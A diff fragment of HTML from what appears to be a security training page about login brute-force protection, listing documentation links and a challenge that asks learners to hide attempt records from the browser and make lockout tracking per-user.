+                                <li><a href="https://www.w3schools.com/python/ref_requests_post.asp" target="_blank">Python Requests post Method</a></li>
+                                <li><a href="https://docs.python.org/3/tutorial/inputoutput.html?highlight=file#reading-and-writing-files" target="_blank">7. Input and Output - Python 3.10.5 documentation</a></li>
+                                <li><a href="https://www.php.net/manual/en/function.fopen.php" target="_blank">PHP: fopen - Manual</a></li>
+                                <li><a href="https://www.php.net/manual/en/function.fclose.php" target="_blank">PHP: fclose - Manual</a></li>
+                                <li><a href="https://www.php.net/manual/en/function.fwrite.php" target="_blank">PHP: fwrite - Manual</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item">
+                    <h2 class="accordion-header" id="headingFive">
+                        <button class="accordion-button custom-challenge collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseFive" aria-expanded="false" aria-controls="collapseFive">
+                            Challenge
+                        </button>
+                    </h2>
+                    <div id="collapseFive" class="accordion-collapse collapse" aria-labelledby="headingFive">
+                        <div class="accordion-body text-start m-3">
+                            <p>
+                                There are some known issues with the current defense mechanism for the login page, please implement a better mechanism for it.
+                                <br>
+                                Known issues:
+                            </p>
+                            <ul>
+                                <li>The attempts records are publicly available, how to keep it unaccessible from the browser?</li>
+                                <li>Legitimate users are likely to be unable to use the page when an attacker keep spamming the website because the attempts records are universal to all users, how to make it more specific?</li>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </main>
+    </body>
+</html>
